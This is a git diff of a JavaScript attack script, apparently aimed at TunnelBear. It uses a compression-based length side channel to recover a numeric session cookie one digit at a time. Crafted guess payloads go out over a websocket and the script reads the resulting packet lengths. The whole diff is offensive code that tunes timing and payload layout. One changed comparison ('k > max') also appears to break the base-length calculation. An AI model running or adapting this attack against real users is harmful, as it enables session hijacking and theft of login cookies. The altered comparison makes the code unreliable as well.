@@ -1,4 +1,4 @@
-const request = require('request')
+// specific to tunnelbear
 const asyncForEach = require('async-foreach').forEach
 const EventEmitter = require('events')
 const config = require('./config.json')
@@ -6,14 +6,15 @@ const config = require('./config.json')
 // would also contain secret
 const url = config.url
 const bodyPrefix = '' // 'Cookie: sessionId=876123219; blah blah blah;'
-const secretPrefix = config.secretPrefix
+const secretPrefix = 'Cookie: ' + config.secretPrefix
 const chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
 let finalSecret = ''
 let ws = null
 
 const sendPayload = (url, payload, done) => {
+  if (ws === null) return
   ws.send(JSON.stringify({url: url.toString(), payload: payload.toString(), finalSecret: finalSecret, secretLength: config.secretLength, secretPrefix: config.secretPrefix}))
-  if (done) setTimeout(done, 200)
+  if (done) setTimeout(done, 300)
   // request.post({
   //   'url': url.toString(),
   //   'body': payload.toString()
@@ -24,7 +25,7 @@ const sendPayload = (url, payload, done) => {
 
 const generateGuessSequences = (secretPrefix, guess) => {
   // repeat = 3
-  return secretPrefix + guess + ' ' + secretPrefix + guess
+  return secretPrefix + guess + '--' + secretPrefix + guess + '__' + secretPrefix + guess + '--' + 'hello' + getRandomString().substr(0, 5)
 }
 
 const getRandomString = () => {
@@ -32,7 +33,8 @@ const getRandomString = () => {
 }
 
 // const randomString = getRandomString() + getRandomString() + getRandomString()
-const randomString = 'yyuljtygzvfyo49eq8lnuvmhmzgyow4r5fh8afsqr0szglv7gppm1f1rs7zuvv13y'
+// const randomString = 'yyuljtygzvfyo49eq8lnuvmhmzgyow4r5fh8afsqr0szglv7gppm1f1rs7zuvv13y'
+const randomString = ' '
 
 const init = (websocket) => {
   finalSecret = ''
@@ -47,9 +49,6 @@ const init = (websocket) => {
     guessAllOracles(ee, baseLength, secretPrefix, (secret) => {
       console.log('secret: ', secret)
       ee.removeAllListeners()
-      // baseLength += 1
-      // // now guess again
-      // guessOracle(ee, baseLength, secretPrefix + guessed.toString(), console.log)
     })
   })
   return ee
@@ -67,6 +66,7 @@ const guessAllOracles = (ee, bl, guessedSecretPrefix, done) => {
     if (finalSecret.length <= config.secretLength) {
       guessAllOracles(ee, bl, guessedSecretPrefix + guessed, done)
     } else {
+      ws = null
       return done(finalSecret)
     }
   })
@@ -93,9 +93,11 @@ const guessOracle = (ee, bl, guessedSecretPrefix, cb) => {
   asyncForEach(chars, function (guess) {
     const done = this.async()
     let payload = bodyPrefix + generateGuessSequences(guessedSecretPrefix, guess.toString()) + ' ' + randomString
-    sendPayload(url, payload.toString(), () => {
-      done()
-    })
+    setTimeout(() => {
+      sendPayload(url, payload.toString(), () => {
+        done()
+      })
+    }, 300)
   })
 }
 
@@ -108,17 +110,20 @@ const getBaseLength = (ee, done) => {
   for (let i = 0; i < times; i++) {
     const payload = bodyPrefix + generateGuessSequences(secretPrefix, '!') + ' ' + randomString
     console.log('getBaseLength: sending.. ' + payload)
-    sendPayload(url, payload)
+    setTimeout(() => {
+      sendPayload(url, payload)
+    }, i * 500)
   }
   ee.on('packet_length', (len) => {
     len = len.toString()
+    console.log('possible base_len: ', len)
     if (count++ > times) return
     // base length is the one with the max count
     if (count === times) {
       let max = 0
       let maxKey = 0
       Object.keys(freq).forEach(k => {
-        if (freq[k] > max) {
+        if (k > max) {
           max = freq[k]
           maxKey = k
         }
